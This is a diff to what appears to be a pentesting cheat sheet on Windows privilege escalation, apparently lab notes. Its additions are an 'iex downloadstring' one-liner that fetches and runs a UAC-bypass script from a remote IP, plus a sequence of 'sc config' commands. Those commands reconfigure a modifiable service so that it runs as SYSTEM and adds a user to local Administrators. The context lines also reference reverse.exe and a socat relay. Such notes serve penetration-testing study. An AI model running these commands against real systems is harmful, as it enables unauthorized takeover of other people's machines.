@@ -802,6 +802,12 @@ Import-Module .\Invoke-EventViewer.ps1
 Invoke-EventViewer c:\temp\reverse.exe
 ```
 
+OR using [FodhelperBypass.ps1](https://raw.githubusercontent.com/winscripting/UAC-bypass/refs/heads/master/FodhelperBypass.ps1)
+
+```
+iex (new-object net.webclient).downloadstring('http://192.168.45.160/FodhelperBypass.ps1')
+```
+
 </details>
 
 <details>
@@ -940,7 +946,7 @@ socat tcp-listen:135,reuseaddr,fork tcp:<victim's IP>:9999
 
 <details>
 
-<summary>Insecure Service Permissions</summary>
+<summary>Insecure Service Permissions (Modifiable Service)</summary>
 
 * Checks the “user” account’s permissions on the ”daclsvc” service
 
@@ -961,6 +967,37 @@ sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
 ```shell
 net start daclsvc
 ```
+
+OR USING POWERSHELL...
+
+```powershell
+cmd /c sc qc <service_name>
+```
+
+<figure><img src="../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>
+
+Start Type --> Change to autostart
+
+```powershell
+cmd /c sc config <service_name> start=auto
+```
+
+Add final.com\nina to local administrators group: --> DO NOTE THAT LocalService doesn't have enough rights to add users
+
+```powershell
+cmd /c sc config <service_name> binpath= "net localgroup Administrators final.com\nina /add" obj= "NT AUTHORITY\SYSTEM"
+```
+
+Ensure that changes are updated & run it
+
+```
+cmd /c sc qc <service_name>
+net start <service_name>
+```
+
+"The service is not responding to the control function." is normal.
+
+<figure><img src="../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>
 
 </details>
 
